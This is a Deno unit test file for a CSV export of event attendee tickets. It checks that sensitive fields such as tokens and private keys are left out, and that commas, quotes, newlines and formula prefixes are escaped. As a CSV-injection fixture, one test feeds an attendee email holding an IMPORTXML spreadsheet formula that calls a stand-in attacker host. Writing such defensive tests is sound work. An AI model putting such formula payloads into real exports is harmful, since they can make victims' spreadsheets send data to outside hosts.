import { assert, assertEquals, assertFalse, assertStringIncludes } from 'jsr:@std/assert';

import { buildOrganizerTicketsCsv } from './organizer-csv.ts';

Deno.test('organizer CSV contains only approved operational fields', () => {
  const csv = buildOrganizerTicketsCsv([
    {
      attendee_email: 'avery@example.com',
      attendee_name: 'Avery Morgan',
      checked_in_at: null,
      generation_count: 2,
      status: 'enrolled',
      ticket_id: 'ticket-1',
      ticket_type_name: 'General Admission',
    },
  ]);

  assertStringIncludes(csv, 'Attendee name,Attendee email,Ticket type,Status');
  assertStringIncludes(csv, 'Avery Morgan,avery@example.com,General Admission,enrolled');
  assertFalse(csv.includes('biometric'));
  assertFalse(csv.includes('access_token'));
  assertFalse(csv.includes('claim_code_digest'));
  assertFalse(csv.includes('claim_code_ciphertext'));
  assertFalse(csv.includes('private_key'));
});

Deno.test('organizer CSV escapes commas, quotes, newlines, and spreadsheet formula prefixes', () => {
  const csv = buildOrganizerTicketsCsv([
    {
      attendee_email: '=IMPORTXML("https://evil.invalid")',
      attendee_name: 'Morgan, "Avery"\nVIP',
      checked_in_at: '2026-06-13T12:00:00.000Z',
      generation_count: 1,
      status: 'checked_in',
      ticket_id: '@ticket',
      ticket_type_name: 'General Admission',
    },
  ]);

  assertStringIncludes(csv, '"Morgan, ""Avery""\nVIP"');
  assertStringIncludes(csv, "'=IMPORTXML");
  assertStringIncludes(csv, "'@ticket");
  assertEquals(csv.split('\r\n').length, 3);
  assert(csv.endsWith('\r\n'));
});
